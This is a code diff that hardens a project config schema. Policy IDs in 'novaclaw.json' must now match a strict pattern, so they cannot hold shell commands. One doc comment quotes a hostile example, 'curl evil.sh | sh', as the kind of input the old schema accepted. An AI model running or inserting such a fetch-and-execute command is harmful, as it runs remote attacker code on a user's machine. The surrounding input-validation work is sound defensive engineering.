@@ -117,6 +117,45 @@ type TuneFeaturesMatchSchema = [TuneFeature] extends [(typeof TUNE_FEATURES)[num
 const _tuneFeaturesMatchSchema: TuneFeaturesMatchSchema = true
 void _tuneFeaturesMatchSchema
 
+/**
+ * The name of ONE installed pre-action policy, as a `novaclaw.json` may spell it.
+ *
+ * 🔴 **The grammar IS the security property, and it is the whole of `todo/projects.md`'s clause
+ * *"`novaclaw.json` may configure policy IDs but may never contain or auto-run shell commands"*.**
+ * The section was `Schema.Array(Schema.String)` until this check landed, which made the clause a
+ * promise in prose: `{"policies":["curl evil.sh | sh"]}` decoded perfectly, and the only thing
+ * standing between that string and a shell was that nothing had been built to consume it yet. A
+ * rule enforced by the absence of a consumer stops being enforced the day the consumer is written —
+ * which is this change.
+ *
+ * So the shape is chosen to make a command **unspellable** rather than to detect one:
+ * lowercase letters, digits, `-` and `.`, between 1 and 64 characters, no leading or trailing
+ * separator. That excludes every character a shell needs to be a shell — no space, no `/`, `\`,
+ * quote, backtick, `$`, `;`, `|`, `&`, `>`, newline — so there is no clever encoding to blacklist
+ * and no "is this command-shaped?" heuristic to get wrong. This is the same argument
+ * `recipe-verify.ts` records for its closed check vocabulary (*an open, caller-supplied command is
+ * `permissionMode` in frontmatter with extra steps*), applied one file over.
+ *
+ * ⚠️ **A violating entry makes the whole file fail to parse, and that is deliberate.** `ProjectFile.parse`
+ * refuses it exactly as it refuses a missing `version`: a file trying to carry a command is not a
+ * `novaclaw.json` this build will act on any part of. Reporting it and honouring the rest would mean
+ * a hostile author gets the sections they wanted plus a warning nobody reads, and it would leave the
+ * product deciding which half of an untrusted file to believe. `ProjectFileResolve` already
+ * distinguishes *malformed* from *missing* so the surface can say which file and why.
+ *
+ * ⚠️ **Case is FIXED at lowercase rather than folded.** An ID is a key looked up in the installed
+ * registry, not a path, so there is no filesystem to inherit case rules from; admitting `No-Secrets`
+ * and `no-secrets` as one name would give a project two spellings for one policy and a receipt two
+ * names for one intervention.
+ */
+export const POLICY_ID_PATTERN = /^[a-z0-9](?:[a-z0-9.-]{0,62}[a-z0-9])?$/
+export const PolicyID = Schema.String.check(Schema.isPattern(POLICY_ID_PATTERN)).annotate({
+  identifier: "Project.PolicyID",
+  description:
+    "The id of an installed pre-action policy: lowercase letters, digits, '-' and '.', 1-64 characters. Never a command.",
+})
+export type PolicyID = typeof PolicyID.Type
+
 /** What a folder may declare about itself. Every section optional: an empty project is still valid. */
 export const Info = Schema.Struct({
   version: Schema.Number,
@@ -134,8 +173,8 @@ export const Info = Schema.Struct({
   tune: Schema.optional(Tune),
   /** Paths this project asks NOT to be read. Globs, matched against the project root. */
   exclude: Schema.optional(Schema.Array(Schema.String)),
-  /** IDs of installed pre-action policies. ⛔ IDs only — never a command, and never anything run. */
-  policies: Schema.optional(Schema.Array(Schema.String)),
+  /** IDs of installed pre-action policies. ⛔ IDs only — see {@link PolicyID}. */
+  policies: Schema.optional(Schema.Array(PolicyID)),
 }).annotate({ identifier: "Project.File" })
 export type Info = typeof Info.Type
 
